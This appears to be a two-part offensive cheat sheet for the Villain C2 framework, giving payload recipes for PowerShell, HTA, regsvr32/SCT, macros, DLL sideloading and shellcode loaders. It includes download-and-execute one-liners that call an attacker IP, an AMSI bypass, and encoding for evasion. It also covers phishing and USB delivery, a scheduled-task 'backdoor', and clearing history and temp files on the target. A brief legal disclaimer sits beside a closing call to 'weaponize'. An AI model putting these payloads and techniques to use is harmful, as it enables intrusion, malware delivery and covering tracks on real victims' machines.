
This enhanced guide provides complete command strings, interactive inputs, and operational notes to generate a wide arsenal of payloads using Villain inside Kali Linux. These payloads are tailored for red team exercises, evasion testing, and malware lab experimentation.

>  **Strictly for legal, isolated environments.** Unauthorized use is a crime.

---

##  Starting Villain C2 Framework

```bash
cd ~/tools/Villain
python3 villain.py
```

### Useful Villain Commands:

```bash
help               # Lists all available commands
generate           # Starts interactive payload generator
sessions           # Lists current sessions
interact <ID>      # Interact with a specific session
kill <ID>          # Kill a session
clear              # Clears the screen
exit               # Exits Villain
```

---

##  Payload Generation Recipes

Below are examples of command sequences and outputs for various payloads.

### 1. PowerShell Reverse Shell

```bash
generate
> LHOST: 192.168.251.10
> LPORT: 65000
> PAYLOAD: powershell
```

Generated One-liner:

```powershell
powershell -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.251.10:8080/endpoint')"
```

### 2. MSBuild Payload (Inline Shellcode)

```bash
generate
> LHOST: 192.168.251.10
> LPORT: 65000
> PAYLOAD: msbuild
```

Usage:

```powershell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe payload.csproj
```

### 3. HTA Script Dropper

```bash
generate
> LHOST: 192.168.251.10
> LPORT: 65000
> PAYLOAD: hta
```

Execution:

```powershell
mshta http://192.168.251.10:8080/payload.hta
```

### 4. VBS Downloader Shell

```bash
generate
> LHOST: 192.168.251.10
> LPORT: 65000
> PAYLOAD: vbs
```

Execute via:

```bash
cscript payload.vbs
```

### 5. JavaScript (WSH) Payload

```bash
generate
> LHOST: 192.168.251.10
> LPORT: 65000
> PAYLOAD: js
```

Execute:

```bash
wscript payload.js
```

### 6. Macro-enabled Office Document

```bash
generate
> LHOST: 192.168.251.10
> LPORT: 65000
> PAYLOAD: macro
```

Steps:

- Embed the macro in a `.docm`
    
- Trick user to enable macros
    

### 7. DLL Payload for Sideloading

```bash
generate
> LHOST: 192.168.251.10
> LPORT: 65000
> PAYLOAD: dll
```

Use with: `rundll32`, DLL hijack, or external injectors.

### 8. Python Reverse Shell Executable

```bash
generate
> LHOST: 192.168.251.10
> LPORT: 65000
> PAYLOAD: python_exe
```

Package with:

```bash
pyinstaller --onefile revshell.py
```

### 9. SCT/XSL Payload via WMI

```bash
generate
> LHOST: 192.168.251.10
> LPORT: 65000
> PAYLOAD: sct
```

Execute:

```powershell
regsvr32 /s /n /u /i:http://192.168.251.10:8080/payload.sct scrobj.dll
```

### 10. Windows Service Binary Replacement

```bash
generate
> LHOST: 192.168.251.10
> LPORT: 65000
> PAYLOAD: service
```

Usage: replace a trusted service binary path with the compiled output.

---

##  Obfuscation Enhancements

### PowerShell AMSI Bypass (Inject Inline)

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
.GetField('amsiInitFailed','NonPublic,Static')
.SetValue($null,$true)
```

### Base64 Encoded One-Liner (Replace `<payload>`)

```powershell
powershell -enc <BASE64_STRING>
```

Encode using:

```bash
echo -n 'PAYLOAD' | iconv -f ASCII -t UTF-16LE | base64 -w0
```

### Invoke-Obfuscation Toolkit

```powershell
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
```

---

##  Delivery Options

|Vector|Tool Required|Notes|
|---|---|---|
|Email Phish|Social Engineer Toolkit|Embed macro or HTA|
|USB Dropper|Manual|Shortcut + LNK or DOC bait|
|Web Server|Villain HTTP|All payloads are auto-hosted|
|SMB|impacket-smbserver|`\<ip>\payload.hta`|
|ISO Image|mkisofs/genisoimage|Auto-mounted on Windows double-click|

---

##  Cleanup Checklist

- `Ctrl+C` to stop Villain
    
- Remove `/tmp/*.tmp`, `.hta`, `.vbs`, and `.ps1`
    
- Purge `$env:AppData`, `%TEMP%`, and PowerShell history
    

---

##  Final Touch Checklist

-  Villain started and reachable
    
-  Payload generated for target OS
    
-  Payload delivered via chosen method
    
-  Session caught and stable
    

---

# Villain C2 Payload Command Arsenal (v2 Enhanced)

This comprehensive, upgraded guide expands the Villain C2 framework’s usage into a full-featured offensive payload platform for advanced red teaming, adversary simulation, and secure lab deployment.

>  **Strictly for legal red teaming, penetration testing, and isolated lab use only.**

---

##  Launching Villain with Robust Options

```bash
cd ~/tools/Villain
python3 villain.py --debug --host 0.0.0.0 --port 5000
```

Options:

* `--debug` enables detailed error logging
* `--host 0.0.0.0` binds to all interfaces
* `--port` customizes web GUI listener (default: 5000)

---

##  Core Villain CLI Commands

```bash
help                   # Show all commands
generate               # Start payload generator
payloads               # List supported payload types
listeners              # Show active listeners
sessions               # View active connections
interact <session_id>  # Get shell access to a beacon
kill <session_id>      # Kill a session
info <session_id>      # View session details
clear                  # Clear the screen
exit                   # Exit Villain CLI
```

---

##  Payload Generator Deep Dive

### Supported Payloads

* powershell
* msbuild
* hta
* vbs
* js
* macro
* dll
* python\_exe
* sct
* service
* exe
* shellcode

Use `payloads` to view current supported types:

```bash
payloads
```

### Global Template

```bash
generate
> LHOST: 192.168.251.10
> LPORT: 65000
> PAYLOAD: <payload_type>
```

---

##  Full Payload Menu with Execution Modes

### 1. PowerShell

```powershell
powershell -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.251.10:8080/endpoint')"
```

Optional Enhancements:

* Add AMSI bypass
* Base64 encode entire command

### 2. MSBuild Inline Shellcode

```bash
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe payload.csproj
```

---

### 3. HTA Script

```powershell
mshta http://192.168.251.10:8080/payload.hta
```

---

### 4. VBS Execution

```bash
cscript payload.vbs
```

---

### 5. JavaScript Payload (WSH)

```bash
wscript payload.js
```

---

### 6. Office Macro Shell

Steps:

* Open Word → Developer → Macros
* Paste generated macro
* Save as `.docm`

---

### 7. DLL Reverse Shell

Execution via:

```bash
rundll32.exe payload.dll,Main
```

Or via any trusted sideloading binary.

---

### 8. SCT/XSL via WMI

```powershell
regsvr32 /s /n /u /i:http://192.168.251.10:8080/payload.sct scrobj.dll
```

---

### 9. Python Executable

Convert using PyInstaller:

```bash
pyinstaller --onefile --noconsole payload.py
```

---

### 10. EXE Payload

```bash
generate
> LHOST: 192.168.251.10
> LPORT: 65000
> PAYLOAD: exe
```

Run directly or wrap in dropper.

---

### 11. Shellcode Loader

* Outputs raw x86/x64 shellcode
* Can be embedded into C or C# loader

Example usage in C:

```c
void (*func)() = (void(*)())shellcode;
func();
```

---

##  Obfuscation & Defense Evasion

### PowerShell AMSI Bypass

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
.GetField('amsiInitFailed','NonPublic,Static')
.SetValue($null,$true)
```

### Encoding to Base64

```bash
echo -n '<command>' | iconv -f ASCII -t UTF-16LE | base64 -w0
```

```powershell
powershell -enc <base64encodedstring>
```

### Obfuscation Toolkits

* `Invoke-Obfuscation`
* `Nishang`
* `PS>Attack`
* `obfuscator.io` (for JS payloads)

---

##  Delivery Vectors & Drop Methods

| Method       | Example Command                                        | Notes                     |
| ------------ | ------------------------------------------------------ | ------------------------- |
| HTTP Server  | `python3 -m http.server 8080`                          | Auto-hosts payloads       |
| SMB Share    | `impacket-smbserver share .`                           | Use `\\<ip>\payload.hta`  |
| ISO Delivery | `genisoimage -o drop.iso payload.exe`                  | Windows auto-mounts ISO   |
| USB Drop     | Copy + rename payload with shortcut icons              | Physical attack vector    |
| Email Phish  | Use `macro`, `hta`, or `docm` payloads                 | Requires user interaction |
| RTF Exploit  | Embed macro or shellcode into RTF using `rtf template` | Advanced targeted payload |
| Windows Task | `schtasks /create /tn backdoor /tr "cmd /c <payload>"` | Persistence + stealth     |

---

## Cleanup Actions

```bash
rm -rf *.hta *.vbs *.js *.ps1 *.dll *.exe *.iso *.sct *.pyc __pycache__/
```

On Windows target:

```powershell
Clear-History
Remove-Item -Path "$env:TEMP\*" -Force -Recurse
```

---

## Final Execution Flow

1. Start Villain C2 server
2. Generate appropriate payload with `generate`
3. Choose hosting & delivery vector (HTTP, SMB, ISO, etc)
4. Deliver payload to Windows target
5. Catch shell → `sessions` → `interact <id>`
6. Use post-exploitation commands inside Villain

---

##  Advanced Additions (To Explore)

* [ ] Integrate Metasploit session bridge
* [ ] Add obfuscated Empire stager compatibility
* [ ] Combine multiple payloads into packer shell (UPX + loader)
* [ ] Build a GUI wrapper to auto-generate and host payloads
* [ ] Create reverse pivot tunnels with Chisel or FRP from Villain payloads

---

Villain becomes lethal when mixed with creativity, stealth, and control. Customize every drop. Script every step. Weaponize with purpose.

\-- Cxb3rf1lthl4bz
